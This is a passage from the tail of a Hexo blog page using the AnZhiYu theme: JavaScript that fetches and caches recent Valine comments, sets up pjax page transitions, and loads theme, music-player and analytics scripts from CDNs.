        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>